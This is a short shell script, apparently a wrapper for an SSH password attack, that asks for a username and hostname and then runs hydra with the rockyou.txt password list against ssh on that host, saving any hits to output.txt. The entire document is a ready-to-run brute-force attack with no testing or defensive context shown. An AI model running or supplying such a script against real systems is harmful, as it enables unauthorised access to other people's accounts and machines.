read -p "input username: " user
read -p "input hostname: " host

hydra -l $user -P rockyou.txt -vV -o output.txt -I ssh://$host
